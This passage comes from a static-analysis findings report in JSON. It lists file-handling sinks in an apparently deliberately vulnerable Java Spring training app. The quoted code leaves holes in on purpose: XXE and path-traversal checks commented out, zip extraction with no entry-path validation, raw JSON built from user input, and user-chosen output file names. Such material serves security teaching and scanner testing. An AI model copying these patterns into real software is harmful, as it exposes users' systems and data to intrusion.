System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";", "                String fileName = filePath + \"user_info.json\";", "                File jsonFile = new File(fileName);", "", "                JsonGenerator jGenerator = jfactory.createJsonGenerator(jsonFile, JsonEncoding.UTF8);", "", "                jGenerator.writeStartObject();", "", "                jGenerator.writeFieldName(\"username\");", "                jGenerator.writeRawValue(\"\\\"\" + userProfile.getUserName() + \"\\\"\");", "", "                jGenerator.writeFieldName(\"password\");", "                jGenerator.writeRawValue(\"\\\"\" + userProfile.getPwd() + \"\\\"\");", "", "                jGenerator.writeFieldName(\"role\");", "                jGenerator.writeRawValue(\"\\\"default\\\"\");", "", "                jGenerator.writeEndObject();", "", "                jGenerator.close();", "                } catch (JsonParseException e) {", "                        if(!isWrong)", "                        logger.error(\"Error during JSON parse\"+e);", "                        isWrong = true;", "                } catch (IOException e) {", "                        logger.error(\"Error during JSON parse\"+e);", "                        isWrong = true;", "                }", "                 return addUserProfile(userProfile);", "                }", "", "", "                else {", "                        return new ModelAndView(\"addUserProfileJSON\",\"userProfile\",new UserProfileForm());", "                }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00146", "function": "java.io.File.File()", "line": "606", "snippet": "SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI); \n\t\t\t  Schema schema = factory.newSchema(new File(path)); \n\t\t\t  Validator validator = schema.newValidator(); \n\t\t\t\t/*", "originalCode": ["        @RequestMapping(value = \"uploademployee.html\", method = RequestMethod.POST)", "        public ModelAndView validateEmployee(@RequestParam(\"file\") MultipartFile file) throws IOException, ParserConfigurationException, SAXException { // process your", "                                                                                                                                                                                                                // file", "                System.out.println(\"ModelAndView --- upload\");", "", "                ModelAndView mv = new ModelAndView();", "                JAXBContext jaxbContext;", "                try {", "                        String path = System.getProperty(\"user.dir\") + \"\\\\EmployeeInfo.xsd\";", "", "                System.out.println(\"Working Directory = \" + path);", "", "                          SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);", "                          Schema schema = factory.newSchema(new File(path));", "                          Validator validator = schema.newValidator();", "                                /*", "                                 * validator.setProperty(XMLConstants.FEATURE_SECURE_PROCESSING, true);", "                                 * validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");", "                                 * validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");", "                                 */", "                          validator.validate(new StreamSource(file.getInputStream()));", "", "", "", "                SAXParserFactory spf = SAXParserFactory.newInstance();", "                        /*", "                         * spf.setFeature(\"http://xml.org/sax/features/external-general-entities\",", "                         * false);", "                         * spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\",", "                         * false); spf.setFeature(", "                         * \"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);", "                         */", "                //Do unmarshall operation", "                Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),", "                                                new InputSource(file.getInputStream()));", "", "                        jaxbContext = JAXBContext.newInstance(EmployeeDtlsBean.class);", "                    Unmarshaller jaxbUnmarshaller = jaxbContext.createUnmarshaller();", "", "                    EmployeeDtlsBean employees = (EmployeeDtlsBean) jaxbUnmarshaller.unmarshal(xmlSource);", "                    List<EmployeeBean> employeeList = employees.getEmployeedtl();", "", "                        /*", "                         * for (EmployeeBean employeeBean:employeeList) {", "                         * employeeService.addEmployee(employeeBean); }", "                         */", "", "                    employeeList.forEach(employeeBean -> {employeeService.addEmployee(employeeBean);});", "", "                        mv.setViewName(\"uploadFile\");", "                        mv.addObject(\"msg\",\"XML is valid and employee details uploaded successfully\");", "                } catch (IOException e) {", "                        logger.error(\"Error during xml processing\", e.getMessage());", "                } catch (JAXBException e) {", "                        logger.error(\"Error during xml processing\", e.getMessage());", "                }", "", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00147", "function": "java.io.File.File()", "line": "301", "snippet": "int index= filePath.lastIndexOf(\"/\");\n\t\t            \tString dirPath = filePath.substring(0, index);\n\t\t                File dir = new File(dirPath);\n\t\t                if(!dir.exists()) {\n\t\t                \tif(dir.mkdir()) {", "originalCode": ["        @RequestMapping(value=\"fileupload.html\", method=RequestMethod.POST)", "        public ModelAndView processUpload(@RequestParam(\"file\") MultipartFile file) throws IOException,MultipartException {", "                // process your file", "                logger.debug(\"Entering the upload process\");", "", "                ModelAndView mv= new ModelAndView();", "", "                if (!file.isEmpty()) {", "                        String name = file.getOriginalFilename();", "                        String extension = FilenameUtils.getExtension(file.getOriginalFilename());", "                        System.out.println(\"extension\"+extension);", "                        String rootPath = System.getProperty(\"catalina.home\");", "", "                        if (\"txt\".equals(extension)) {", "                                try {", "                                        byte[] bytes = file.getBytes();", "", "                                        // Creating the directory to store file", "                                        File dir = new File(rootPath + File.separator + \"tmpFiles\");", "                                        if (!dir.exists())", "                                                dir.mkdirs();", "", "                                        // Create the file on server", "                                        File serverFile = new File(dir.getAbsolutePath()+ File.separator + name);", "", "                                        //if (serverFile.getCanonicalFile().getName().equals(name)) {", "                                                //serverFile.setWritable(false);", "                                                // This restricts user from overriding the file with same filenam", "                                                /*", "                                                 * serverFile.setExecutable(false, true);", "                                                 * serverFile.setReadable(false, true);", "                                                 * serverFile.setWritable(false, true);", "                                                 */", "", "                                                BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(serverFile));", "                                                stream.write(bytes);", "                                                stream.close();", "", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\", \"You successfully uploaded file=\" + name);", "                                        /*} else {", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\",\"You failed to upload file, since the file name tried to manipulate path\");", "                                        }*/", "", "                                        return mv;", "                                } catch (Exception e) {", "                                        mv.setViewName(\"uploadFile\");", "                                        mv.addObject(\"msg\", \"You failed to upload \" + name + \" => \");", "                                        return mv;", "                                }", "                        } else if (\"zip\".equals(extension)) {", "                                String destDirectory = rootPath + File.separator + \"tmpFiles\";", "                                File destDir = new File(destDirectory);", "                        if (!destDir.exists()) {", "                            destDir.mkdir();", "                        }", "                        ZipInputStream zipIn = new ZipInputStream(file.getInputStream());", "                        ZipEntry entry = zipIn.getNextEntry();", "                        // iterates over entries in the zip file", "                        while (entry != null && !entry.isDirectory()) {", "                            String filePath = destDirectory + File.separator + entry.getName();", "                            //checks if the zip entry file is overriden -- Vul 209", "                            //checkZipEntryOverwrite(destDir,entry);", "", "                            if (!entry.getName().contains(\"/\")) {", "                                // if the entry is a file, extracts it directly", "                                filePath = Encode.forHtmlAttribute(filePath);", "                                extractFile(zipIn, filePath);", "                            } else {", "                                // if the entry is a directory, make the directory", "                                int index= filePath.lastIndexOf(\"/\");", "                                String dirPath = filePath.substring(0, index);", "                                File dir = new File(dirPath);", "                                if(!dir.exists()) {", "                                        if(dir.mkdir()) {", "                                                System.out.println(\"Directory created\");", "                                        }", "                                }", "                                extractFile(zipIn, filePath);", "                            }", "                            zipIn.closeEntry();", "                            entry = zipIn.getNextEntry();", "                        }", "                        zipIn.close();", "", "                        mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\",\"You successfully uploaded file=\" + name);", "                    } else {", "                                mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\", \"Only text files can be uploaded\");", "                                return mv;", "                        }", "", "                } else {", "                        mv.setViewName(\"uploadFile\");", "                        mv.addObject(\"msg\", \"You failed to upload because the file was empty.\");", "                        return mv;", "                }", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00148", "function": "java.io.File.File()", "line": "301", "snippet": "int index= filePath.lastIndexOf(\"/\");\n\t\t            \tString dirPath = filePath.substring(0, index);\n\t\t                File dir = new File(dirPath);\n\t\t                if(!dir.exists()) {\n\t\t                \tif(dir.mkdir()) {", "originalCode": ["        @RequestMapping(value=\"fileupload.html\", method=RequestMethod.POST)", "        public ModelAndView processUpload(@RequestParam(\"file\") MultipartFile file) throws IOException,MultipartException {", "                // process your file", "                logger.debug(\"Entering the upload process\");", "", "                ModelAndView mv= new ModelAndView();", "", "                if (!file.isEmpty()) {", "                        String name = file.getOriginalFilename();", "                        String extension = FilenameUtils.getExtension(file.getOriginalFilename());", "                        System.out.println(\"extension\"+extension);", "                        String rootPath = System.getProperty(\"catalina.home\");", "", "                        if (\"txt\".equals(extension)) {", "                                try {", "                                        byte[] bytes = file.getBytes();", "", "                                        // Creating the directory to store file", "                                        File dir = new File(rootPath + File.separator + \"tmpFiles\");", "                                        if (!dir.exists())", "                                                dir.mkdirs();", "", "                                        // Create the file on server", "                                        File serverFile = new File(dir.getAbsolutePath()+ File.separator + name);", "", "                                        //if (serverFile.getCanonicalFile().getName().equals(name)) {", "                                                //serverFile.setWritable(false);", "                                                // This restricts user from overriding the file with same filenam", "                                                /*", "                                                 * serverFile.setExecutable(false, true);", "                                                 * serverFile.setReadable(false, true);", "                                                 * serverFile.setWritable(false, true);", "                                                 */", "", "                                                BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(serverFile));", "                                                stream.write(bytes);", "                                                stream.close();", "", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\", \"You successfully uploaded file=\" + name);", "                                        /*} else {", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\",\"You failed to upload file, since the file name tried to manipulate path\");", "                                        }*/", "", "                                        return mv;", "                                } catch (Exception e) {", "                                        mv.setViewName(\"uploadFile\");", "                                        mv.addObject(\"msg\", \"You failed to upload \" + name + \" => \");", "                                        return mv;", "                                }", "                        } else if (\"zip\".equals(extension)) {", "                                String destDirectory = rootPath + File.separator + \"tmpFiles\";", "                                File destDir = new File(destDirectory);", "                        if (!destDir.exists()) {", "                            destDir.mkdir();", "                        }", "                        ZipInputStream zipIn = new ZipInputStream(file.getInputStream());", "                        ZipEntry entry = zipIn.getNextEntry();", "                        // iterates over entries in the zip file", "                        while (entry != null && !entry.isDirectory()) {", "                            String filePath = destDirectory + File.separator + entry.getName();", "                            //checks if the zip entry file is overriden -- Vul 209", "                            //checkZipEntryOverwrite(destDir,entry);", "", "                            if (!entry.getName().contains(\"/\")) {", "                                // if the entry is a file, extracts it directly", "                                filePath = Encode.forHtmlAttribute(filePath);", "                                extractFile(zipIn, filePath);", "                            } else {", "                                // if the entry is a directory, make the directory", "                                int index= filePath.lastIndexOf(\"/\");", "                                String dirPath = filePath.substring(0, index);", "                                File dir = new File(dirPath);", "                                if(!dir.exists()) {", "                                        if(dir.mkdir()) {", "                                                System.out.println(\"Directory created\");", "                                        }", "                                }", "                                extractFile(zipIn, filePath);", "                            }", "                            zipIn.closeEntry();", "                            entry = zipIn.getNextEntry();", "                        }", "                        zipIn.close();", "", "                        mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\",\"You successfully uploaded file=\" + name);", "                    } else {", "                                mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\", \"Only text files can be uploaded\");", "                                return mv;", "                        }", "", "                } else {", "                        mv.setViewName(\"uploadFile\");", "                        mv.addObject(\"msg\", \"You failed to upload because the file was empty.\");", "                        return mv;", "                }", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00149", "function": "java.io.FileOutputStream.FileOutputStream()", "line": "331", "snippet": "private void extractFile(ZipInputStream zipIn, String filePath) throws IOException {\n        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filePath));\n        byte[] bytesIn = new byte[BUFFER_SIZE];\n        int read = 0;", "originalCode": ["        private void extractFile(ZipInputStream zipIn, String filePath) throws IOException {", "        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filePath));", "        byte[] bytesIn = new byte[BUFFER_SIZE];", "        int read = 0;", "        while ((read = zipIn.read(bytesIn)) != -1) {", "            bos.write(bytesIn, 0, read);", "        }", "        bos.close();", "    }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00150", "function": "java.io.File.File()", "line": "301", "snippet": "int index= filePath.lastIndexOf(\"/\");\n\t\t            \tString dirPath = filePath.substring(0, index);\n\t\t                File dir = new File(dirPath);\n\t\t                if(!dir.exists()) {\n\t\t                \tif(dir.mkdir()) {", "originalCode": ["        @RequestMapping(value=\"fileupload.html\", method=RequestMethod.POST)", "        public ModelAndView processUpload(@RequestParam(\"file\") MultipartFile file) throws IOException,MultipartException {", "                // process your file", "                logger.debug(\"Entering the upload process\");", "", "                ModelAndView mv= new ModelAndView();", "", "                if (!file.isEmpty()) {", "                        String name = file.getOriginalFilename();", "                        String extension = FilenameUtils.getExtension(file.getOriginalFilename());", "                        System.out.println(\"extension\"+extension);", "                        String rootPath = System.getProperty(\"catalina.home\");", "", "                        if (\"txt\".equals(extension)) {", "                                try {", "                                        byte[] bytes = file.getBytes();", "", "                                        // Creating the directory to store file", "                                        File dir = new File(rootPath + File.separator + \"tmpFiles\");", "                                        if (!dir.exists())", "                                                dir.mkdirs();", "", "                                        // Create the file on server", "                                        File serverFile = new File(dir.getAbsolutePath()+ File.separator + name);", "", "                                        //if (serverFile.getCanonicalFile().getName().equals(name)) {", "                                                //serverFile.setWritable(false);", "                                                // This restricts user from overriding the file with same filenam", "                                                /*", "                                                 * serverFile.setExecutable(false, true);", "                                                 * serverFile.setReadable(false, true);", "                                                 * serverFile.setWritable(false, true);", "                                                 */", "", "                                                BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(serverFile));", "                                                stream.write(bytes);", "                                                stream.close();", "", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\", \"You successfully uploaded file=\" + name);", "                                        /*} else {", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\",\"You failed to upload file, since the file name tried to manipulate path\");", "                                        }*/", "", "                                        return mv;", "                                } catch (Exception e) {", "                                        mv.setViewName(\"uploadFile\");", "                                        mv.addObject(\"msg\", \"You failed to upload \" + name + \" => \");", "                                        return mv;", "                                }", "                        } else if (\"zip\".equals(extension)) {", "                                String destDirectory = rootPath + File.separator + \"tmpFiles\";", "                                File destDir = new File(destDirectory);", "                        if (!destDir.exists()) {", "                            destDir.mkdir();", "                        }", "                        ZipInputStream zipIn = new ZipInputStream(file.getInputStream());", "                        ZipEntry entry = zipIn.getNextEntry();", "                        // iterates over entries in the zip file", "                        while (entry != null && !entry.isDirectory()) {", "                            String filePath = destDirectory + File.separator + entry.getName();", "                            //checks if the zip entry file is overriden -- Vul 209", "                            //checkZipEntryOverwrite(destDir,entry);", "", "                            if (!entry.getName().contains(\"/\")) {", "                                // if the entry is a file, extracts it directly", "                                filePath = Encode.forHtmlAttribute(filePath);", "                                extractFile(zipIn, filePath);", "                            } else {", "                                // if the entry is a directory, make the directory", "                                int index= filePath.lastIndexOf(\"/\");", "                                String dirPath = filePath.substring(0, index);", "                                File dir = new File(dirPath);", "                                if(!dir.exists()) {", "                                        if(dir.mkdir()) {", "                                                System.out.println(\"Directory created\");", "                                        }", "                                }", "                                extractFile(zipIn, filePath);", "                            }", "                            zipIn.closeEntry();", "                            entry = zipIn.getNextEntry();", "                        }", "                        zipIn.close();", "", "                        mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\",\"You successfully uploaded file=\" + name);", "                    } else {", "                                mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\", \"Only text files can be uploaded\");", "                                return mv;", "                        }", "", "                } else {", "                        mv.setViewName(\"uploadFile\");", "                        mv.addObject(\"msg\", \"You failed to upload because the file was empty.\");", "                        return mv;", "                }", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00151", "function": "java.io.FileWriter.FileWriter()", "line": "1050", "snippet": "String data =\"<EmployeeInfo><empName>Jhanvi</empName></EmployeeInfo>\";\n\n\t\t    FileWriter fileWriter = new FileWriter(filePath);\n\t\t    XMLWriter writerxml = new XMLWriter(fileWriter);\n\t\t    writerxml.write(data);", "originalCode": ["        @RequestMapping(value=\"creatxml.html\", method= {RequestMethod.GET,RequestMethod.POST})", "        public ModelAndView createXML(HttpServletRequest request) throws Exception {", "                ModelAndView mv = new ModelAndView();", "", "                String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\output.xml\";", "", "                XMLOutputFactory factory      = XMLOutputFactory.newInstance();", "                XMLEventFactory  eventFactory = XMLEventFactory.newInstance();", "", "                try {", "                    XMLEventWriter writer =", "                            factory.createXMLEventWriter(", "                                    new FileWriter(filePath));", "                    String data =\"<EmployeeInfo><empName>Jhanvi</empName></EmployeeInfo>\";", "", "                    FileWriter fileWriter = new FileWriter(filePath);", "                    XMLWriter writerxml = new XMLWriter(fileWriter);", "                    writerxml.write(data);", "                    writerxml.close();", "", "", "                    XMLEvent event = eventFactory.createStartDocument();", "                    writer.add(event);", "", "                    event = eventFactory.createStartElement(", "                            \"jenkov\", \"http://jenkov.com\", \"document\");", "                    writer.add(event);", "", "                    event = eventFactory.createNamespace(", "                            \"jenkov\", \"http://jenkov.com\");", "                    writer.add(event);", "", "                    event = eventFactory.createAttribute", "                            (\"attribute\", request.getAttribute(\"node\")!=null?(String)request.getAttribute(\"node\"):\"Defaultvalue\");", "                    writer.add(event);", "                    event = eventFactory.createAttribute", "                            (\"attribute\", data);", "                    writer.add(event);", "", "                    event = eventFactory.createEndElement(", "                            \"jenkov\", \"http://jenkov.com\", \"document\");", "                    writer.add(event);", "", "                    writer.flush();", "                    writer.close();", "                    mv.addObject(\"msg\", \"XML file created\");", "                        mv.setViewName(\"uploadFile\");", "                } catch (XMLStreamException e) {", "                    e.printStackTrace();", "                } catch (IOException e) {", "                    e.printStackTrace();", "                }", "", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00152", "function": "java.nio.file.Paths.get()", "line": "876", "snippet": "private boolean remediatedFile(String filePath) throws Exception {\n\t\tString originalFilePath = filePath;\n\t\tFile file = Paths.get(filePath, new String[0]).toFile();\n\t\tString remediatedFilePath = file.getCanonicalFile().toString();\n\t\tboolean isFileNameValid = remediatedFilePath.equals(originalFilePath);", "originalCode": ["        private boolean remediatedFile(String filePath) throws Exception {", "                String originalFilePath = filePath;", "                File file = Paths.get(filePath, new String[0]).toFile();", "                String remediatedFilePath = file.getCanonicalFile().toString();", "                boolean isFileNameValid = remediatedFilePath.equals(originalFilePath);", "", "                if(isFileNameValid && file.exists()) {", "                        //Application logic goes here", "                }", "                return false;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00155", "function": "java.io.File.File()", "line": "281", "snippet": "} else if (\"zip\".equals(extension)) {\n\t\t\t\tString destDirectory = rootPath + File.separator + \"tmpFiles\";\n\t\t\t\tFile destDir = new File(destDirectory);\n\t\t        if (!destDir.exists()) {\n\t\t            destDir.mkdir();", "originalCode": ["        @RequestMapping(value=\"fileupload.html\", method=RequestMethod.POST)", "        public ModelAndView processUpload(@RequestParam(\"file\") MultipartFile file) throws IOException,MultipartException {", "                // process your file", "                logger.debug(\"Entering the upload process\");", "", "                ModelAndView mv= new ModelAndView();", "", "                if (!file.isEmpty()) {", "                        String name = file.getOriginalFilename();", "                        String extension = FilenameUtils.getExtension(file.getOriginalFilename());", "                        System.out.println(\"extension\"+extension);", "                        String rootPath = System.getProperty(\"catalina.home\");", "", "                        if (\"txt\".equals(extension)) {", "                                try {", "                                        byte[] bytes = file.getBytes();", "", "                                        // Creating the directory to store file", "                                        File dir = new File(rootPath + File.separator + \"tmpFiles\");", "                                        if (!dir.exists())", "                                                dir.mkdirs();", "", "                                        // Create the file on server", "                                        File serverFile = new File(dir.getAbsolutePath()+ File.separator + name);", "", "                                        //if (serverFile.getCanonicalFile().getName().equals(name)) {", "                                                //serverFile.setWritable(false);", "                                                // This restricts user from overriding the file with same filenam", "                                                /*", "                                                 * serverFile.setExecutable(false, true);", "                                                 * serverFile.setReadable(false, true);", "                                                 * serverFile.setWritable(false, true);", "                                                 */", "", "                                                BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(serverFile));", "                                                stream.write(bytes);", "                                                stream.close();", "", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\", \"You successfully uploaded file=\" + name);", "                                        /*} else {", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\",\"You failed to upload file, since the file name tried to manipulate path\");", "                                        }*/", "", "                                        return mv;", "                                } catch (Exception e) {", "                                        mv.setViewName(\"uploadFile\");", "                                        mv.addObject(\"msg\", \"You failed to upload \" + name + \" => \");", "                                        return mv;", "                                }", "                        } else if (\"zip\".equals(extension)) {", "                                String destDirectory = rootPath + File.separator + \"tmpFiles\";", "                                File destDir = new File(destDirectory);", "                        if (!destDir.exists()) {", "                            destDir.mkdir();", "                        }", "                        ZipInputStream zipIn = new ZipInputStream(file.getInputStream());", "                        ZipEntry entry = zipIn.getNextEntry();", "                        // iterates over entries in the zip file", "                        while (entry != null && !entry.isDirectory()) {", "                            String filePath = destDirectory + File.separator + entry.getName();", "                            //checks if the zip entry file is overriden -- Vul 209", "                            //checkZipEntryOverwrite(destDir,entry);", "", "                            if (!entry.getName().contains(\"/\")) {", "                                // if the entry is a file, extracts it directly", "                                filePath = Encode.forHtmlAttribute(filePath);", "                                extractFile(zipIn, filePath);", "                            } else {", "                                // if the entry is a directory, make the directory", "                                int index= filePath.lastIndexOf(\"/\");", "                                String dirPath = filePath.substring(0, index);", "                                File dir = new File(dirPath);", "                                if(!dir.exists()) {", "                                        if(dir.mkdir()) {", "                                                System.out.println(\"Directory created\");", "                                        }", "                                }", "                                extractFile(zipIn, filePath);", "                            }", "                            zipIn.closeEntry();", "                            entry = zipIn.getNextEntry();", "                        }", "                        zipIn.close();", "", "                        mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\",\"You successfully uploaded file=\" + name);", "                    } else {", "                                mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\", \"Only text files can be uploaded\");", "                                return mv;", "                        }", "", "                } else {", "                        mv.setViewName(\"uploadFile\");", "                        mv.addObject(\"msg\", \"You failed to upload because the file was empty.\");", "                        return mv;", "                }", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00157", "function": "java.io.File.File()", "line": "246", "snippet": "// Creating the directory to store file\n\t\t\t\t\tFile dir = new File(rootPath + File.separator + \"tmpFiles\");\n\t\t\t\t\tif (!dir.exists())\n\t\t\t\t\t\tdir.mkdirs();", "originalCode": ["        @RequestMapping(value=\"fileupload.html\", method=RequestMethod.POST)", "        public ModelAndView processUpload(@RequestParam(\"file\") MultipartFile file) throws IOException,MultipartException {", "                // process your file", "                logger.debug(\"Entering the upload process\");", "", "                ModelAndView mv= new ModelAndView();", "", "                if (!file.isEmpty()) {", "                        String name = file.getOriginalFilename();", "                        String extension = FilenameUtils.getExtension(file.getOriginalFilename());", "                        System.out.println(\"extension\"+extension);", "                        String rootPath = System.getProperty(\"catalina.home\");", "", "                        if (\"txt\".equals(extension)) {", "                                try {", "                                        byte[] bytes = file.getBytes();", "", "                                        // Creating the directory to store file", "                                        File dir = new File(rootPath + File.separator + \"tmpFiles\");", "                                        if (!dir.exists())", "                                                dir.mkdirs();", "", "                                        // Create the file on server", "                                        File serverFile = new File(dir.getAbsolutePath()+ File.separator + name);", "", "                                        //if (serverFile.getCanonicalFile().getName().equals(name)) {", "                                                //serverFile.setWritable(false);", "                                                // This restricts user from overriding the file with same filenam", "                                                /*", "                                                 * serverFile.setExecutable(false, true);", "                                                 * serverFile.setReadable(false, true);", "                                                 * serverFile.setWritable(false, true);", "                                                 */", "", "                                                BufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(serverFile));", "                                                stream.write(bytes);", "                                                stream.close();", "", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\", \"You successfully uploaded file=\" + name);", "                                        /*} else {", "                                                mv.setViewName(\"uploadFile\");", "                                                mv.addObject(\"msg\",\"You failed to upload file, since the file name tried to manipulate path\");", "                                        }*/", "", "                                        return mv;", "                                } catch (Exception e) {", "                                        mv.setViewName(\"uploadFile\");", "                                        mv.addObject(\"msg\", \"You failed to upload \" + name + \" => \");", "                                        return mv;", "                                }", "                        } else if (\"zip\".equals(extension)) {", "                                String destDirectory = rootPath + File.separator + \"tmpFiles\";", "                                File destDir = new File(destDirectory);", "                        if (!destDir.exists()) {", "                            destDir.mkdir();", "                        }", "                        ZipInputStream zipIn = new ZipInputStream(file.getInputStream());", "                        ZipEntry entry = zipIn.getNextEntry();", "                        // iterates over entries in the zip file", "                        while (entry != null && !entry.isDirectory()) {", "                            String filePath = destDirectory + File.separator + entry.getName();", "                            //checks if the zip entry file is overriden -- Vul 209", "                            //checkZipEntryOverwrite(destDir,entry);", "", "                            if (!entry.getName().contains(\"/\")) {", "                                // if the entry is a file, extracts it directly", "                                filePath = Encode.forHtmlAttribute(filePath);", "                                extractFile(zipIn, filePath);", "                            } else {", "                                // if the entry is a directory, make the directory", "                                int index= filePath.lastIndexOf(\"/\");", "                                String dirPath = filePath.substring(0, index);", "                                File dir = new File(dirPath);", "                                if(!dir.exists()) {", "                                        if(dir.mkdir()) {", "                                                System.out.println(\"Directory created\");", "                                        }", "                                }", "                                extractFile(zipIn, filePath);", "                            }", "                            zipIn.closeEntry();", "                            entry = zipIn.getNextEntry();", "                        }", "                        zipIn.close();", "", "                        mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\",\"You successfully uploaded file=\" + name);", "                    } else {", "                                mv.setViewName(\"uploadFile\");", "                                mv.addObject(\"msg\", \"Only text files can be uploaded\");", "                                return mv;", "                        }", "", "                } else {", "                        mv.setViewName(\"uploadFile\");", "                        mv.addObject(\"msg\", \"You failed to upload because the file was empty.\");", "                        return mv;", "                }", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00158", "function": "java.io.FileWriter.FileWriter()", "line": "1047", "snippet": "XMLEventWriter writer =\n\t\t            factory.createXMLEventWriter(\n\t\t                    new FileWriter(filePath));\n\t\t    String data =\"<EmployeeInfo><empName>Jhanvi</empName></EmployeeInfo>\";", "originalCode": ["        @RequestMapping(value=\"creatxml.html\", method= {RequestMethod.GET,RequestMethod.POST})", "        public ModelAndView createXML(HttpServletRequest request) throws Exception {", "                ModelAndView mv = new ModelAndView();", "", "                String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\output.xml\";", "", "                XMLOutputFactory factory      = XMLOutputFactory.newInstance();", "                XMLEventFactory  eventFactory = XMLEventFactory.newInstance();", "", "                try {", "                    XMLEventWriter writer =", "                            factory.createXMLEventWriter(", "                                    new FileWriter(filePath));", "                    String data =\"<EmployeeInfo><empName>Jhanvi</empName></EmployeeInfo>\";", "", "                    FileWriter fileWriter = new FileWriter(filePath);", "                    XMLWriter writerxml = new XMLWriter(fileWriter);", "                    writerxml.write(data);", "                    writerxml.close();", "", "", "                    XMLEvent event = eventFactory.createStartDocument();", "                    writer.add(event);", "", "                    event = eventFactory.createStartElement(", "                            \"jenkov\", \"http://jenkov.com\", \"document\");", "                    writer.add(event);", "", "                    event = eventFactory.createNamespace(", "                            \"jenkov\", \"http://jenkov.com\");", "                    writer.add(event);", "", "                    event = eventFactory.createAttribute", "                            (\"attribute\", request.getAttribute(\"node\")!=null?(String)request.getAttribute(\"node\"):\"Defaultvalue\");", "                    writer.add(event);", "                    event = eventFactory.createAttribute", "                            (\"attribute\", data);", "                    writer.add(event);", "", "                    event = eventFactory.createEndElement(", "                            \"jenkov\", \"http://jenkov.com\", \"document\");", "                    writer.add(event);", "", "                    writer.flush();", "                    writer.close();", "                    mv.addObject(\"msg\", \"XML file created\");", "                        mv.setViewName(\"uploadFile\");", "                } catch (XMLStreamException e) {", "                    e.printStackTrace();", "                } catch (IOException e) {", "                    e.printStackTrace();", "                }", "", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00159", "function": "java.io.File.File()", "line": "441", "snippet": "prop.setProperty(\"sec_password_encrypted\", encryptedText);\n\t\t\t\n\t\t\tFile file = new File(fileName);\n\t\t\tFileOutputStream fileOut = new FileOutputStream(file);\n\t\t\tprop.store(fileOut, \"writing encrypted password\");", "originalCode": ["        @RequestMapping(value=\"downloadPropFile.html\", method=RequestMethod.POST)", "        public ModelAndView downloadPropertyFile(HttpServletRequest request, HttpServletResponse response) throws Exception {", "        ModelAndView mv = new ModelAndView();", "", "                /*", "                 * java.util.logging.Logger logger2 = (java.util.logging.Logger)", "                 * LoggerFactory.getLogger(EmployeeController.class);", "                 * logger2.setLevel(Level.parse(\"com.domain.application.debugLevel\"));", "                 */", "", "", "                try (InputStream input = LoginDAO.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {", "", "                        Properties prop = new Properties();", "                        prop.load(input);", "", "                        String dbpwd = prop.getProperty(\"sec_password\");", "                        String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";", "                        this.fileName = request.getParameter(\"name\")!=null? request.getParameter(\"name\") : filePath + \"sec_conn_encrypted.properties\";", "", "                        String encryptedText = encryptWithSHA(dbpwd);", "                        logger.debug(\"Encrypted password---\",encryptedText);", "                        //logger2.log(Level.parse(\"com.domain.application.debugLevel\"), \"Test logger\");", "                        